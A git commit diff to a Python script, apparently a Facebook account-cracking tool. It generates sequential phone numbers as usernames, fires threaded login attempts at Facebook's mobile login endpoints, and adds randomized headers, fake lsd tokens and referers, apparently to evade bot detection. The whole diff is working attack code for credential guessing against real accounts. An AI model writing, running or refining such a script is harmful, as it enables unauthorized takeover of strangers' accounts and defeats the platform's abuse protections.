ea0c46d61f46e5428b08013b6e29c3c4efd5fb88
Shadid21 <76004861+Shadid21@users.noreply.github.com>
2024-02-22 20:34:20 +0600

    Add files via upload

--- rantest.py
+++ rantest.py
@@ -1,4 +1,5 @@
 import os, re, sys, uuid, random, requests, time, json
+import string
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
 
@@ -26,13 +27,30 @@ def ua():
     xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
     return xx
 
+def lsb():
+    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
+    lower = ''.join(random.choices(string.ascii_lowercase, k=4))
+    number = ''.join(random.choices(string.digits, k=1))
+    password = upper + lower + number
+    password_list = list(password)
+    random.shuffle(password_list)
+    return ''.join(password_list)
+
+def referer():
+    upper = ''.join(random.choices(string.ascii_uppercase, k=6))
+    lower = ''.join(random.choices(string.ascii_lowercase, k=6))
+    number = ''.join(random.choices(string.digits, k=5))
+    password = upper + lower + number
+    password_list = list(password)
+    random.shuffle(password_list)
+    return ''.join(password_list)
 
 loop = 0
 oks = []
 
 # ----------CK Update----------#
 
-agent = "Mozilla/5.0 (Linux; Android 12; CPH2095 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36"
+agent = "Mozilla/5.0 (Linux; Android 12; CPH2095 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36"
 # -----GRAPH
 
 
@@ -49,8 +67,9 @@ user = []
 def main():
 
     inp = int(input("How many do want to chek? -> "))
-    # code=input("Put your number -> ")
-    code = "01850819272"
+    print("Give you number ex: 01850819272")
+    code=input("Put your number -> ")
+
     for i in range(inp):
         # gg=str(random.choice(range(10000000,99999999)))
         gg = str(int(code) + i)
@@ -75,7 +94,7 @@ def main():
         fb = "free"
     else:
         fb = "mbasic"
-    with ThreadPool(max_workers=40) as update:
+    with ThreadPool(max_workers=70) as update:
 
         for xd in user:
             uid = "0" + xd
@@ -102,32 +121,38 @@ def host(uid, pwx, meth, fb):
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
             uax = windows()
+            ver1 = str(random.randrange(1, 99))
+            ver2 = str(random.randrange(90, 121))
+            lsd = lsb()
+            refer = referer()
+            dpr = str(random.randrange(2, 6))
+            sceme = random.choice(['light', 'dark'])
             had = {
                 'Host': f'{fb}.facebook.com',
-                'content-length': '1640',
-                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
+                'content-length': str(random.randrange(1600, 1800, 10)),
+                'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
                 'sec-ch-ua-mobile': '?1',
                 'user-agent': uax,
                 'x-response-format': 'JSONStream',
                 'content-type': 'application/x-www-form-urlencoded',
-                'x-fb-lsd': 'AVreZWR72Tc',
+                'x-fb-lsd': lsd,
                 'viewport-width': '360',
                 'sec-ch-ua-platform-version': '""',
                 'x-requested-with': 'XMLHttpRequest',
                 'x-asbd-id': '129477',
-                'dpr': '2',
+                'dpr': dpr,
                 'sec-ch-ua-full-version-list': '',
                 'sec-ch-ua-model': '""',
-                'sec-ch-prefers-color-scheme': 'light',
+                'sec-ch-prefers-color-scheme': sceme,
                 'sec-ch-ua-platform': '"Android"',
                 'accept': '*/*',
                 'origin': f'https://{fb}.facebook.com',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-dest': 'empty',
-                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_0e8HatvwFQ9PX3jwD&refsrc=deprecated&_rdr',
+                'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
                 'accept-encoding': 'gzip, deflate, br,',
-                'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
+                'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
             url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             session.post(url=url, data=info, headers=had)
             heron_brand = session.cookies.get_dict().keys()
